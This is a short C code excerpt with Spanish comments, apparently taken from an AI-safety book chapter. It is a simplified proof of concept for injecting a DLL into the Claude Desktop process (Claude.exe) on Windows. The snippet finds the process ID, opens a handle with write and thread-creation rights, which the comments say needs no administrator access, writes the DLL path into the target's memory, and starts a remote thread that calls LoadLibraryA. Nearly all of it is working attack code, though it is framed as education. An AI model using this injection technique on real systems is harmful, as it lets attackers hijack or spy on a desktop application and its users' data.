// Extraido de: LibroAISafety/cap-21-caso-claude-desktop.md
// Fragmento simplificado del PoC de inyección
// (educativo — omite manejo de errores y funciones auxiliares)

// 1. Encontrar el PID de Claude Desktop
DWORD pid = FindProcessByName("Claude.exe");

// 2. Abrir handle al proceso (no requiere admin)
HANDLE hProc = OpenProcess(
    PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
    FALSE, pid
);

// 3. Escribir la ruta de nuestra DLL en el proceso
LPVOID remotePath = VirtualAllocEx(hProc, NULL, pathLen, ...);
WriteProcessMemory(hProc, remotePath, dllPath, pathLen, NULL);

// 4. Crear hilo remoto que carga nuestra DLL
CreateRemoteThread(hProc, NULL, 0,
    (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandle("kernel32"), "LoadLibraryA"),
    remotePath, 0, NULL);
